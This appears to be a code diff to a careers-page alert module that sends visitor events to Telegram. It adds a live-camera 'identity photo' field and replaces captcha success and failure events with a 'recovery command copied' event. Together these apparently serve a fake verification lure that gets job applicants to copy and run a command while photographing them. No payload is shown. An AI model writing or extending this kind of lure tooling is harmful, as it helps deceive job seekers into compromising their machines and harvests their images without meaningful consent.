@@ -200,6 +200,7 @@ export function formatCareersAlert(data: {
   githubOrPortfolio: string;
   secondLinkLabel?: string;
   resumeName?: string;
+  photoCaptured?: boolean;
   message: string;
   context?: VisitorContextLines;
 }): string {
@@ -222,6 +223,7 @@ export function formatCareersAlert(data: {
     `<b>LinkedIn:</b> ${escapeTelegramHtml(data.linkedin) || "—"}`,
     `<b>${escapeTelegramHtml(data.secondLinkLabel || "GitHub / Portfolio")}:</b> ${escapeTelegramHtml(data.githubOrPortfolio) || "—"}`,
     `<b>Resume:</b> ${escapeTelegramHtml(data.resumeName || "—")}`,
+    `<b>Identity photo:</b> ${data.photoCaptured ? "Captured (live camera)" : "—"}`,
     "",
     "<b>Note:</b>",
     escapeTelegramHtml(data.message),
@@ -269,15 +271,13 @@ export function formatChatAlert(data: ChatTurnAlert): string {
 }
 
 export function formatCaptchaAlert(data: {
-  event: "started" | "completed" | "abandoned";
+  event: "started" | "copy_command";
   context: VisitorContextLines;
 }): string {
   const title =
     data.event === "started"
       ? "🔐 Careers verification started"
-      : data.event === "completed"
-        ? "✅ Careers verification completed"
-        : "❌ Careers verification failed";
+      : "✅ Careers recovery command copied";
 
   return [`<b>${title}</b>`, formatVisitorContextBlock(data.context)].join("\n");
 }
